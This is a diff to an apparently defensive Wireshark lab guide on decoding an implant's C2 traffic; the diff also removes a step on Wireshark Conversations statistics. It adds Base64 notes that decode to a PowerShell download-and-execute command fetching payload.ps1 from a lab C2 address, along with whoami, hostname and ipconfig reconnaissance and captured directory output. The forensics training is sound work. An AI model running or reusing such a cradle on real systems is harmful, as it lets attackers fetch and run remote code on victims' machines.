@@ -130,7 +130,14 @@ http.request.method == "POST"
 
 ## Step 10 - Decode the C2 Command with Python
 
-- Switch back to the terminal. Take the Base64 string you found after `cmd=` in Step 8 and substitute it below
+- Switch back to the terminal. Take the Base64 strings you found after `cmd=` in Step 8 and substitute it below
+
+>[!NOTES]
+>Here are the 2 strings for simplicity:
+>
+>SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC41Ni4xL3BheWxvYWQucHMxJyk=
+>
+>d2hvYW1pOyBob3N0bmFtZTsgaXBjb25maWcgL2FsbA==
 
 ```bash
 python3 -c "import base64; print(base64.b64decode('<paste_base64_here>').decode())"
@@ -146,19 +153,16 @@ python3 -c "import base64; print(base64.b64decode('<paste_base64_here>').decode(
 
 - Take the Base64 string you found after `output=` in Step 9 and substitute it below
 
+>[!NOTES]
+>Here is the string for simplicity:
+>
+>Q09SUFxqc21pdGgNCiBWb2x1bWUgaW4gZHJpdmUgQyBoYXMgbm8gbGFiZWwuDQogVm9sdW1lIFNlcmlhbCBOdW1iZXIgaXMgQTFCMi1DM0Q0DQogRGlyZWN0b3J5IG9mIEM6XFVzZXJzXGpzbWl0aFxEb2N1bWVudHMNCjAzLzEyLzIwMjYgIDA5OjE1IEFNICAgIDxESVI+ICAgICAgICAgIC4NCjAzLzEyLzIwMjYgIDA5OjE1IEFNICAgIDxESVI+ICAgICAgICAgIC4uDQowMy8xMi8yMDI2ICAwODo0NCBBTSAgICAgICAgICAgICAxLDAyNCBub3Rlcy50eHQNCjAzLzEyLzIwMjYgIDA5OjEwIEFNICAgICAgICAgICAgMTIsMjg4IHJlcG9ydC5kb2N4DQogICAgICAgICAgICAgICAyIEZpbGUocykgICAgICAgICAxMywzMTIgYnl0ZXMNCiAgICAgICAgICAgICAgIDIgRGlyKHMpICA0NSw2NzgsOTAxLDIzNCBieXRlcyBmcmVlDQo=
+
 ```bash
 python3 -c "import base64; print(base64.b64decode('<paste_base64_here>').decode())"
 ```
 
 - The decoded output reveals exactly what data the implant shipped to the operator - a `whoami` result showing the compromised user's domain identity, followed by a directory listing of their Documents folder. The operator now knows who they are running as and what files are on the system. This kind of initial access reconnaissance is a standard first step after landing on a new host
 
----
 
-## Step 12 - Use Wireshark Statistics to Confirm the Beacon Pattern
-
-- In the Wireshark menu bar, click **Statistics** -> **Conversations**.
-
-- Click the **TCP** tab. You will see a row for each distinct TCP conversation in the capture. Sort by **Address A** or **Address B** to group the C2 sessions together. You will see five or six short-lived conversations between `10.0.0.5` and `192.168.56.1:80` - one per beacon cycle plus one for the exfiltration POST. Each conversation carries only a handful of packets, confirming the short-burst session pattern vsagent is designed around
-
-- Close the Conversations window
 
